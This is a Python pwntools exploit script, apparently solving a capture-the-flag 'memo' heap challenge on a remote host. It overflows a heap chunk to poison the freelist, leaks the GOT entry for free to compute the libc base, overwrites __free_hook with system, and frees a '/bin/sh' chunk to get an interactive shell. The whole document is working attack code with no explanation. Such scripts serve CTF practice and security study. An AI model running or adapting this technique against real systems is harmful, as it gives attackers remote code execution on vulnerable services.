from pwn import *

#s = process("./memo_bin")
#libc = ELF("libc.so.6")
s = remote("54.202.7.144",8888)
libc = ELF("memo_libc.so.6")

s.sendline(randoms(31))
s.sendline("n")
s.recvuntil(">> ")

def leave(message, idx):
	s.send("00000001")
	s.recvuntil("Index")
	s.send("%08d" % idx)
	s.recvuntil("Length")
	s.send("%08d" % (len(message)))
	s.send(message)
	s.clean(.5)
	#s.recvuntil(">> ")

def delete(idx):
	s.send("00000004")
	s.recvuntil("Index")
	s.send("%08d" % idx)
	s.clean(.5)
	#s.recvuntil(">> ")
	
def view(idx):
	s.send("00000003")
	s.recvuntil("Index")
	s.send("%08d" % idx)
	s.recvuntil("View Message: ")
	buf = s.recvuntil("1. ")
	s.clean(.5)
	return buf[:-3]

leave("A"*32, 0)
leave("B"*(32), 1)
leave("C"*(17), 2)
leave("/bin/sh", 3)
leave("E"*(32), 4)


#print s.proc.pid
delete(2)
delete(1)

ptr = 0x602a70-8
leave("A"*(0x28)+p64(0x21)+p64(ptr), 1)

leave("A"*16, 1)
free_got = 0x601F78
leave(p64(free_got)+"Q"*8, 2)

got = view(1).strip()
free_ptr = u64(got.ljust(8,"\x00"))

print "%x" % (free_ptr)

s.send("00000002")

libc.address = free_ptr - libc.symbols["free"]

s.send(p64(libc.symbols["__free_hook"])*2)

s.send("00000002")
s.send(p64(libc.symbols["system"]))
s.clean(0.5)

s.send("00000004")
s.sendline("3")
print hex(libc.address)
s.sendline("ls")
s.interactive()
